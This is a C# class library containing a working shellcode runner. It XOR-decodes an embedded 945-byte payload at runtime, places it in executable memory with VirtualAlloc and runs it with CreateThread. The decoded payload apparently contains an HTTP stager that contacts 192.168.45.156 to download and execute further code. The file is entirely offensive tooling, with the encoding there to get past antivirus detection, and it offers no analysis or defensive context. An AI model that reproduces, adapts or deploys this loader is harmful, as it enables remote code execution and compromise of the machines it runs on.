using System;
using System.Runtime.InteropServices;

namespace ClassLibrary1
{
    public class Class1
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public static void runner()
        {
            byte[] buf = new byte[945] { 0x86, 0x32, 0xf9, 0x9e, 0x8a, 0x92, 0xb6, 0x7a, 0x7a, 0x7a, 0x3b, 0x2b, 0x3b, 0x2a, 0x28, 0x32, 0x4b, 0xa8, 0x2b, 0x1f, 0x32, 0xf1, 0x28, 0x1a, 0x32, 0xf1, 0x28, 0x62, 0x32, 0xf1, 0x28, 0x5a, 0x2c, 0x32, 0xf1, 0x08, 0x2a, 0x32, 0x75, 0xcd, 0x30, 0x30, 0x37, 0x4b, 0xb3, 0x32, 0x4b, 0xba, 0xd6, 0x46, 0x1b, 0x06, 0x78, 0x56, 0x5a, 0x3b, 0xbb, 0xb3, 0x77, 0x3b, 0x7b, 0xbb, 0x98, 0x97, 0x28, 0x3b, 0x2b, 0x32, 0xf1, 0x28, 0x5a, 0xf1, 0x38, 0x46, 0x32, 0x7b, 0xaa, 0x1c, 0xfb, 0x02, 0x62, 0x71, 0x78, 0x75, 0xff, 0x08, 0x7a, 0x7a, 0x7a, 0xf1, 0xfa, 0xf2, 0x7a, 0x7a, 0x7a, 0x32, 0xff, 0xba, 0x0e, 0x1d, 0x32, 0x7b, 0xaa, 0xf1, 0x32, 0x62, 0x2a, 0x3e, 0xf1, 0x3a, 0x5a, 0x33, 0x7b, 0xaa, 0x99, 0x2c, 0x32, 0x85, 0xb3, 0x37, 0x4b, 0xb3, 0x3b, 0xf1, 0x4e, 0xf2, 0x32, 0x7b, 0xac, 0x32, 0x4b, 0xba, 0x3b, 0xbb, 0xb3, 0x77, 0xd6, 0x3b, 0x7b, 0xbb, 0x42, 0x9a, 0x0f, 0x8b, 0x36, 0x79, 0x36, 0x5e, 0x72, 0x3f, 0x43, 0xab, 0x0f, 0xa2, 0x22, 0x3e, 0xf1, 0x3a, 0x5e, 0x33, 0x7b, 0xaa, 0x1c, 0x3b, 0xf1, 0x76, 0x32, 0x3e, 0xf1, 0x3a, 0x66, 0x33, 0x7b, 0xaa, 0x3b, 0xf1, 0x7e, 0xf2, 0x32, 0x7b, 0xaa, 0x3b, 0x22, 0x3b, 0x22, 0x24, 0x23, 0x20, 0x3b, 0x22, 0x3b, 0x23, 0x3b, 0x20, 0x32, 0xf9, 0x96, 0x5a, 0x3b, 0x28, 0x85, 0x9a, 0x22, 0x3b, 0x23, 0x20, 0x32, 0xf1, 0x68, 0x93, 0x31, 0x85, 0x85, 0x85, 0x27, 0x32, 0x4b, 0xa1, 0x29, 0x33, 0xc4, 0x0d, 0x13, 0x14, 0x12, 0x0e, 0x0e, 0x0a, 0x7a, 0x3b, 0x2c, 0x32, 0xf3, 0x9b, 0x33, 0xbd, 0xb8, 0x36, 0x0d, 0x5c, 0x7d, 0x85, 0xaf, 0x29, 0x29, 0x32, 0xf3, 0x9b, 0x29, 0x20, 0x37, 0x4b, 0xba, 0x37, 0x4b, 0xb3, 0x29, 0x29, 0x33, 0xc0, 0x7e, 0x65, 0xe7, 0xc1, 0x7a, 0x7a, 0x7a, 0x7a, 0x85, 0xaf, 0x33, 0xf3, 0xbe, 0x92, 0x64, 0x7a, 0x7a, 0x7a, 0x4b, 0x7a, 0x43, 0x7a, 0x48, 0x7a, 0x54, 0x7a, 0x4b, 0x7a, 0x4c, 0x7a, 0x42, 0x7a, 0x54, 0x7a, 0x4e, 0x7a, 0x4f, 0x7a, 0x54, 0x7a, 0x4b, 0x7a, 0x4f, 0x7a, 0x4c, 0x7a, 0x7a, 0x7a, 0x20, 0x32, 0xf3, 0xbb, 0x33, 0xbd, 0xba, 0x81, 0x5a, 0x7a, 0x7a, 0x37, 0x4b, 0xb3, 0x33, 0xc0, 0x3c, 0xe1, 0x64, 0xb8, 0x7a, 0x7a, 0x7a, 0x7a, 0x85, 0xaf, 0x92, 0x86, 0x7a, 0x7a, 0x7a, 0x12, 0x7a, 0x0e, 0x7a, 0x0e, 0x7a, 0x0a, 0x7a, 0x40, 0x7a, 0x55, 0x7a, 0x55, 0x7a, 0x4b, 0x7a, 0x43, 0x7a, 0x48, 0x7a, 0x54, 0x7a, 0x4b, 0x7a, 0x4c, 0x7a, 0x42, 0x7a, 0x54, 0x7a, 0x4e, 0x7a, 0x4f, 0x7a, 0x54, 0x7a, 0x4b, 0x7a, 0x4f, 0x7a, 0x4c, 0x7a, 0x40, 0x7a, 0x42, 0x7a, 0x4e, 0x7a, 0x4e, 0x7a, 0x49, 0x7a, 0x55, 0x7a, 0x0a, 0x7a, 0x1b, 0x7a, 0x03, 0x7a, 0x16, 0x7a, 0x15, 0x7a, 0x1b, 0x7a, 0x1e, 0x7a, 0x54, 0x7a, 0x0d, 0x7a, 0x15, 0x7a, 0x1c, 0x7a, 0x1c, 0x7a, 0x55, 0x7a, 0x2d, 0x7a, 0x08, 0x7a, 0x17, 0x7a, 0x57, 0x7a, 0x30, 0x7a, 0x0d, 0x7a, 0x1e, 0x7a, 0x03, 0x7a, 0x0a, 0x7a, 0x4d, 0x7a, 0x30, 0x7a, 0x3d, 0x7a, 0x1f, 0x7a, 0x2f, 0x7a, 0x1e, 0x7a, 0x4d, 0x7a, 0x33, 0x7a, 0x3f, 0x7a, 0x0d, 0x7a, 0x03, 0x7a, 0x0a, 0x7a, 0x1d, 0x7a, 0x14, 0x7a, 0x36, 0x7a, 0x38, 0x7a, 0x4a, 0x7a, 0x32, 0x7a, 0x32, 0x7a, 0x11, 0x7a, 0x02, 0x7a, 0x0a, 0x7a, 0x28, 0x7a, 0x36, 0x7a, 0x29, 0x7a, 0x13, 0x7a, 0x32, 0x7a, 0x20, 0x7a, 0x33, 0x7a, 0x4b, 0x7a, 0x2e, 0x7a, 0x03, 0x7a, 0x3c, 0x7a, 0x35, 0x7a, 0x03, 0x7a, 0x4f, 0x7a, 0x13, 0x7a, 0x4b, 0x7a, 0x35, 0x7a, 0x2b, 0x7a, 0x4b, 0x7a, 0x3d, 0x7a, 0x0e, 0x7a, 0x0d, 0x7a, 0x33, 0x7a, 0x17, 0x7a, 0x4b, 0x7a, 0x09, 0x7a, 0x3c, 0x7a, 0x57, 0x7a, 0x36, 0x7a, 0x3e, 0x7a, 0x0c, 0x7a, 0x33, 0x7a, 0x19, 0x7a, 0x38, 0x7a, 0x4c, 0x7a, 0x15, 0x7a, 0x09, 0x7a, 0x0d, 0x7a, 0x0d, 0x7a, 0x2f, 0x7a, 0x20, 0x7a, 0x1e, 0x7a, 0x28, 0x7a, 0x0e, 0x7a, 0x00, 0x7a, 0x1d, 0x7a, 0x2e, 0x7a, 0x33, 0x7a, 0x1b, 0x7a, 0x3e, 0x7a, 0x19, 0x7a, 0x13, 0x7a, 0x35, 0x7a, 0x13, 0x7a, 0x7a, 0x7a, 0x32, 0xf3, 0xbb, 0x29, 0x20, 0x3b, 0x22, 0x37, 0xf3, 0xbf, 0x33, 0xf9, 0xba, 0x4e, 0x37, 0x4b, 0xb3, 0x29, 0x32, 0xbd, 0xba, 0x7a, 0x7b, 0x7a, 0x7a, 0x2a, 0x29, 0x29, 0x33, 0xbd, 0xb8, 0xe2, 0x6a, 0xc9, 0x21, 0x85, 0xaf, 0x32, 0xf3, 0xbc, 0x32, 0xf9, 0x92, 0x5a, 0x32, 0xf3, 0x9d, 0x32, 0xf3, 0x83, 0x33, 0xbd, 0xb8, 0x5b, 0xdd, 0x71, 0x1a, 0x85, 0xaf, 0xff, 0xba, 0x75, 0xfe, 0x17, 0x7a, 0x7a, 0x7a, 0x32, 0xf1, 0x3d, 0x72, 0xff, 0xba, 0x0e, 0x40, 0x32, 0xf3, 0xa3, 0x32, 0x85, 0xbb, 0x32, 0xbb, 0x9b, 0x5a, 0x2b, 0x29, 0x2a, 0x32, 0xc2, 0x79, 0x7a, 0x7a, 0x7a, 0x79, 0x7a, 0x7a, 0x7a, 0x2a, 0x33, 0xf3, 0x9a, 0x32, 0xf9, 0x96, 0x5a, 0x32, 0xf3, 0x9d, 0x33, 0xf3, 0x83, 0x36, 0xf3, 0x9b, 0x36, 0xf3, 0x90, 0x33, 0xbd, 0xb8, 0xa0, 0xa7, 0x90, 0x33, 0x85, 0xaf, 0xff, 0xba, 0x0e, 0x57, 0x91, 0x68, 0x32, 0xf1, 0x3d, 0x6a, 0xff, 0xba, 0x0e, 0x59, 0x32, 0xf9, 0xbd, 0x72, 0x10, 0x79, 0x22, 0x32, 0xf3, 0x7d, 0x33, 0xf3, 0x82, 0x10, 0x62, 0x3b, 0x23, 0x32, 0xf3, 0x8b, 0x10, 0x5c, 0x20, 0x33, 0xc0, 0xa9, 0x22, 0xe7, 0xb4, 0x7a, 0x7a, 0x7a, 0x7a, 0x85, 0xaf, 0x10, 0x70, 0x25, 0x29, 0x20, 0x32, 0xf3, 0x8b, 0x37, 0x4b, 0xb3, 0x29, 0x29, 0x29, 0x29, 0x33, 0xc0, 0xef, 0x22, 0xc1, 0xeb, 0x7a, 0x7a, 0x7a, 0x7a, 0x85, 0xaf, 0xff, 0xba, 0x0f, 0x76, 0x32, 0x85, 0xb5, 0x0e, 0x78, 0x91, 0xa7, 0x92, 0x03, 0x7a, 0x7a, 0x7a, 0x32, 0xf3, 0x8b, 0x29, 0x20, 0x33, 0xbd, 0xb8, 0x7f, 0xf2, 0xe7, 0x0a, 0x85, 0xaf, 0xff, 0xba, 0x0e, 0x93, 0x29, 0x32, 0xf3, 0x98, 0x29, 0x33, 0xf3, 0x9b, 0x10, 0x7e, 0x3b, 0x22, 0x32, 0xf3, 0x8b, 0x33, 0xbd, 0xb8, 0x16, 0x53, 0x5e, 0x04, 0x85, 0xaf, 0xff, 0xba, 0x0e, 0xb7, 0x32, 0xf9, 0xbe, 0x52, 0x29, 0x23, 0x20, 0x32, 0xf3, 0xa9, 0x10, 0x3a, 0x3b, 0x23, 0x33, 0xbd, 0xba, 0x7a, 0x6a, 0x7a, 0x7a, 0x33, 0xc0, 0x22, 0xde, 0x29, 0x9f, 0x7a, 0x7a, 0x7a, 0x7a, 0x85, 0xaf, 0x32, 0xe9, 0x29, 0x29, 0x32, 0xf3, 0x9d, 0x32, 0xf3, 0x8b, 0x33, 0xf3, 0xba, 0x32, 0xf3, 0xa0, 0x33, 0xf3, 0x83, 0x33, 0xbd, 0xb8, 0x16, 0x53, 0x5e, 0x04, 0x85, 0xaf, 0x32, 0xf9, 0xbe, 0x5a, 0xff, 0xba, 0x75, 0xfe, 0xfe, 0x85, 0x85, 0x85, 0x22, 0xb9, 0x22, 0x10, 0x7a, 0x23, 0xc1, 0x9a, 0x67, 0x50, 0x70, 0x3b, 0xf3, 0xa0, 0x85, 0xaf };
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(buf[i] ^ (byte)'z');
            }

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}